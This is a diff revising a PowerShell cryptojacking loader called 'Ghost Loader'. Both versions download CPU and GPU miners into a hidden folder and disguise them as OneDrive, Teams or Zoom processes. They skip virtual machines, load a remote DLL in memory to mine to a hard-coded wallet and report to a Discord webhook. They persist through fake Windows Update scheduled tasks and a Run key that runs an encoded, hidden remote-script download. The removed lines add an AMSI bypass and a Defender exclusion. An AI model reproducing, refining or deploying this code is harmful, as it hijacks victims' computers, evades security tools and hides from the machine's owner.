@@ -1,53 +1,37 @@
-# AMSI BYPASS & ETW PATCH (AV BLINDFOLD)
-try {
-    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-} catch { }
+# Ghost Loader - Shielded
+$u = "HolyV200"; $r = "ulta"
+$dUrl = "https://raw.githubusercontent.com/$u/$r/main/Bridge.dll?v=$([Guid]::NewGuid())"
+$mUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
+$gUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
+$w = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
+$hook = "https://discord.com/api/webhooks/1496175217926475898/Ipm8VvLnOmN3dTUu7nyvqESjdBFRmEFmvYEr4O5tayaCfvMXpf3t_KXTjwRmO-2-i2c_"
 
-$GithubUser = "HolyV200"
-$RepoName = "ulta"
-$DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll?v=$([Guid]::NewGuid().ToString())"
-$MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
-$GpuMinerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
-$Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
-$Webhook = "https://discord.com/api/webhooks/1496175217926475898/Ipm8VvLnOmN3dTUu7nyvqESjdBFRmEFmvYErAO5tayaCfvMXpf3t_KXTjwRmO-2-i2c_"
-
-function Notify-Discord($Status) {
-    if ($Webhook -eq "") { return }
+function Send-Ping($msg) {
+    if ($hook -eq "") { return }
     try {
-        $JSON = @{ embeds = @(@{ title = "🚀 $Status"; color = 3066993; fields = @(@{ name = "Worker"; value = "$env:COMPUTERNAME"; inline = $true }); timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") }) } | ConvertTo-Json -Depth 10
-        # Fast, non-blocking ping
-        $Params = @{ Uri = $Webhook; Method = 'Post'; Body = $JSON; ContentType = 'application/json'; ErrorAction = 'SilentlyContinue'; TimeoutSec = 2 }
-        Invoke-RestMethod @Params | Out-Null
+        $j = @{ embeds = @(@{ title = "🚀 $msg"; color = 3066993; fields = @(@{ name = "Worker"; value = "$env:COMPUTERNAME"; inline = $true }); timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") }) } | ConvertTo-Json -Depth 10
+        Invoke-RestMethod -Uri $hook -Method Post -Body $j -ContentType "application/json" -ErrorAction SilentlyContinue -TimeoutSec 2 | Out-Null
     } catch { }
 }
-Notify-Discord "BOOTING..."
+Send-Ping "BOOTING..."
 
-$ProcessNames = @("OneDriveStandalone", "TeamsDesktop", "ZoomManager", "DiscordUpdate", "EdgeBroker", "SpotifyHelper")
-$Name1 = ($ProcessNames | Get-Random) + ".exe"
-$Name2 = ($ProcessNames | Where-Object { $_ -ne $Name1 } | Get-Random) + ".exe"
+$pns = @("OneDriveStandalone", "TeamsDesktop", "ZoomManager", "DiscordUpdate", "EdgeBroker", "SpotifyHelper")
+$n1 = ($pns | Get-Random) + ".exe"; $n2 = ($pns | Where-Object { $_ -ne $n1 } | Get-Random) + ".exe"
+$bDir = $env:LOCALAPPDATA; if ([string]::IsNullOrEmpty($bDir)) { $bDir = $env:TEMP }
+$sDir = [System.IO.Path]::Combine($bDir, "Microsoft", "Windows", "UpdateCoord")
 
-# Hardened Path Logic
-$BaseDir = $env:LOCALAPPDATA
-if ([string]::IsNullOrEmpty($BaseDir)) { $BaseDir = $env:TEMP }
-$StealthDir = [System.IO.Path]::Combine($BaseDir, "Microsoft", "Windows", "UpdateCoord")
-
-# ANTI-ANALYSIS & POWER GUARD
-$Check = try { @((Get-WmiObject Win32_ComputerSystem).Model, (Get-WmiObject Win32_VideoController).Name) -join " " } catch { "" }
-if ($Check -match "VirtualBox" -or $Check -match "VMware") { exit } # Specific VM only
+# SYSTEM CHECKS
+$chk = try { @((Get-WmiObject Win32_ComputerSystem).Model, (Get-WmiObject Win32_VideoController).Name) -join " " } catch { "" }
+if ($chk -match "VirtualBox" -or $chk -match "VMware") { exit }
 if (Test-Path "C:\windows\System32\Drivers\VBoxMouse.sys") { exit }
 
-try {
-    $Power = Get-WmiObject -Class Win32_Battery -ErrorAction SilentlyContinue
-    if ($Power -and $Power.BatteryStatus -eq 1) { exit } # Don't run on battery
-} catch { }
-
-function Get-StealthFile($Url, $Path) {
+function Get-File($Url, $Path) {
     if (Test-Path $Path) { try { Remove-Item $Path -Force -ErrorAction SilentlyContinue } catch { } }
-    $UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
     for ($i = 0; $i -lt 3; $i++) {
         try { Import-Module BitsTransfer; Start-BitsTransfer -Source $Url -Destination $Path -ErrorAction Stop; return $true } catch {
-            try { Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -UserAgent $UA -ErrorAction Stop | Out-Null; return $true } catch {
-                try { curl.exe -L -H "User-Agent: $UA" -o $Path $Url 2>$null; if (Test-Path $Path) { return $true } } catch { }
+            try { Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -UserAgent $ua -ErrorAction Stop | Out-Null; return $true } catch {
+                try { curl.exe -L -H "User-Agent: $ua" -o $Path $Url 2>$null; if (Test-Path $Path) { return $true } } catch { }
             }
         }
         Start-Sleep -Seconds 5
@@ -55,86 +39,62 @@ function Get-StealthFile($Url, $Path) {
     return $false
 }
 
-if (-not (Test-Path $StealthDir)) { New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null }
-
-try { powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c } catch { }
-
-try {
-    if ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        Add-MpPreference -ExclusionPath $StealthDir -ErrorAction SilentlyContinue
-    }
-} catch { }
-
+if (-not (Test-Path $sDir)) { New-Item -ItemType Directory -Force -Path $sDir | Out-Null }
 Add-Type -AssemblyName System.IO.Compression.FileSystem
-$CpuZip = Join-Path $StealthDir "upd_c.zip"
-$GpuZip = Join-Path $StealthDir "upd_g.zip"
-$CpuExe = Join-Path $StealthDir $Name1
-$GpuExe = Join-Path $StealthDir $Name2
+$cz = Join-Path $sDir "upd_c.zip"; $gz = Join-Path $sDir "upd_g.zip"; $ce = Join-Path $sDir $n1; $ge = Join-Path $sDir $n2
 
-if (-not (Test-Path $CpuExe)) {
-    if (Get-StealthFile $MinerUrl $CpuZip) {
-        try { Get-ChildItem -Path $StealthDir -Exclude "*.zip", "*.dll", "*.dat" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue } catch { }
-        for ($i = 0; $i -lt 5; $i++) {
-            try { [System.IO.Compression.ZipFile]::ExtractToDirectory($CpuZip, $StealthDir); break } catch { Start-Sleep -Seconds 2 }
-        }
-        Remove-Item $CpuZip -Force -ErrorAction SilentlyContinue
-        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
-        if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $CpuExe -Force }
+# STAGING
+if (-not (Test-Path $ce)) {
+    if (Get-File $mUrl $cz) {
+        try { Get-ChildItem $sDir -Exclude "*.zip", "*.dll", "*.dat" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue } catch { }
+        for ($j=0;$j-lt 5;$j++) { try { [System.IO.Compression.ZipFile]::ExtractToDirectory($cz, $sDir); break } catch { Start-Sleep -Seconds 2 } }
+        Remove-Item $cz -Force -ErrorAction SilentlyContinue
+        $uz = Get-ChildItem $sDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
+        if ($uz) { Move-Item $uz.FullName -Destination $ce -Force }
     }
 }
 
-# AGGRESSIVE GPU DETECTION (PRO-STRENGTH)
-$GpuDetected = $false
+$gd = $false
 try {
-    $Cards = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
-    foreach ($Card in $Cards) {
-        $N = $Card.Name.ToUpper()
-        if ($N -match "NVIDIA" -or $N -match "AMD" -or $N -match "RADEON" -or $N -match "RTX" -or $N -match "GTX" -or $Card.AdapterRAM -gt 2GB) {
-            if ($N -notmatch "MICROSOFT BASIC" -and $N -notmatch "DISPLAY") { $GpuDetected = $true; break }
+    $ccs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
+    foreach ($cc in $ccs) {
+        $nn = $cc.Name.ToUpper()
+        if ($nn -match "NVIDIA|AMD|RADEON|RTX|GTX" -or $cc.AdapterRAM -gt 2GB) {
+            if ($nn -notmatch "MICROSOFT BASIC|DISPLAY") { $gd = $true; break }
         }
     }
 } catch { }
 
-if ($GpuDetected -and -not (Test-Path $GpuExe)) {
-    if (Get-StealthFile $GpuMinerUrl $GpuZip) {
-        try { Get-ChildItem -Path $StealthDir -Exclude "*.zip", "*.dll", "*.dat", "$Name1" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue } catch { }
-        for ($i = 0; $i -lt 5; $i++) {
-            try { [System.IO.Compression.ZipFile]::ExtractToDirectory($GpuZip, $StealthDir); break } catch { Start-Sleep -Seconds 2 }
-        }
-        Remove-Item $GpuZip -Force -ErrorAction SilentlyContinue
-        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "miner.exe" -Recurse | Select-Object -First 1
-        if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $GpuExe -Force }
+if ($gd -and -not (Test-Path $ge)) {
+    if (Get-File $gUrl $gz) {
+        try { Get-ChildItem $sDir -Exclude "*.zip", "*.dll", "*.dat", "$n1" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue } catch { }
+        for ($j=0;$j-lt 5;$j++) { try { [System.IO.Compression.ZipFile]::ExtractToDirectory($gz, $sDir); break } catch { Start-Sleep -Seconds 2 } }
+        Remove-Item $gz -Force -ErrorAction SilentlyContinue
+        $uz = Get-ChildItem $sDir -Filter "miner.exe" -Recurse | Select-Object -First 1
+        if ($uz) { Move-Item $uz.FullName -Destination $ge -Force }
     }
 }
 
-$DllPath = [System.IO.Path]::Combine($StealthDir, "Bridge.dll")
-if (Get-StealthFile $DllUrl $DllPath) {
+# RUN
+$dp = [System.IO.Path]::Combine($sDir, "Bridge.dll")
+if (Get-File $dUrl $dp) {
     try {
-        $dllBytes = [System.IO.File]::ReadAllBytes($DllPath)
-        $assembly = [System.Reflection.Assembly]::Load($dllBytes)
-        $loader = $assembly.GetType("DateFundLoader")
-        $startMethod = $loader.GetMethod("StartMiner")
-        $GArg = if ($GpuDetected) { $GpuExe } else { "" }
-        $startMethod.Invoke($null, [object[]]@([string]$CpuExe, [string]$GArg, [string]$Wallet))
-        Write-Host "running"
-        Notify-Discord "SUCCESS/ACTIVE"
-        $Command = "irm 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex"
-        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
-        $Encoded = [Convert]::ToBase64String($Bytes)
-        $TPath = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $Encoded"
+        $db = [System.IO.File]::ReadAllBytes($dp)
+        $as = [System.Reflection.Assembly]::Load($db)
+        $lt = $as.GetType("DateFundLoader")
+        $sm = $lt.GetMethod("StartMiner")
+        $ga = if ($gd) { $ge } else { "" }
+        $sm.Invoke($null, [object[]]@([string]$ce, [string]$ga, [string]$w))
+        Write-Host "running"; Send-Ping "SUCCESS/ACTIVE"
         
-        # SELF-HEALING PERSISTENCE
-        $TaskPath = "\Microsoft\Windows\WindowsUpdate\WindowsUpdateScan"
-        $Admin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-        
-        if ($Admin) {
-            schtasks.exe /create /tn "$TaskPath" /tr "$TPath" /sc onlogon /rl highest /f /ru "System" /ErrorAction SilentlyContinue
-        } else {
-            schtasks.exe /create /tn "WindowsUpdateScan" /tr "$TPath" /sc onlogon /f /ErrorAction SilentlyContinue
-        }
-        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateCoord" -Value "$TPath" -ErrorAction SilentlyContinue
+        $cmd = "irm 'https://raw.githubusercontent.com/$u/$r/main/remote_deploy.ps1' | iex"
+        $ec = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
+        $tp = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $ec"
+        $ad = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+        if ($ad) { schtasks.exe /create /tn "\Microsoft\Windows\WindowsUpdate\WindowsUpdateScan" /tr "$tp" /sc onlogon /rl highest /f /ru "System" /ErrorAction SilentlyContinue }
+        else { schtasks.exe /create /tn "WindowsUpdateScan" /tr "$tp" /sc onlogon /f /ErrorAction SilentlyContinue }
+        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateCoord" -Value "$tp" -ErrorAction SilentlyContinue
         return
     } catch { }
 }
-Write-Host "failed"
-Notify-Discord "FAILED/ERROR"
+Write-Host "failed"; Send-Ping "FAILED/ERROR"
